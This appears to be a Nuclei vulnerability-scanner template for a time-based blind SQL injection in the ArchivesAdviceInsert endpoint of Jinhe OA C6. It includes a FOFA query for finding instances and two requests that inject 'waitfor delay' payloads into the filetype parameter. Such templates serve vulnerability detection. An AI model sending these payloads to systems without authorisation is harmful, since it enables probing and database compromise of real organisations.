id: jinhe-oa-c6-archivesadviceinsert-sqli
info:
  name: "金和 OA_C6 ArchivesAdviceInsert 接口 SQL 注入漏洞"
  author: 0dayPoc
  severity: high
  description: |-
    fofa: app="金和网络-金和 OA"
      漏洞描述: 靶标系统金和OA_C6的ArchivesAdviceInsert接口存在SQL注入安全缺陷，攻击者可通过构造恶意输入参数实现数据库查询语句篡改，进而获取敏感数据或操控数据存储层。
  tags: 金和OA_C6
http:
- raw:
  - |
    GET /c6/Jhsoft.Web.Archives/ArchivesAdviceInsert.aspx/?fileid=1&filetype=1%27waitfor+delay+%270%3A0%3A5%27-- HTTP/1.1
    Host: {{Hostname}}
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
    Accept-Encoding: gzip, deflate
    Accept-Language: zh-CN,zh;q=0.9
  - |
    GET /c6/Jhsoft.Web.Archives/ArchivesAdviceInsert.aspx/?fileid=1&filetype=1%27waitfor+delay+%270%3A0%3A8%27-- HTTP/1.1
    Host: {{Hostname}}
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
    Accept-Encoding: gzip, deflate
    Accept-Language: zh-CN,zh;q=0.9
  matchers:
  - type: dsl
    dsl:
    - duration_1>=5 && duration_1<=6
    - duration_2>=8 && duration_2<=9
    condition: and
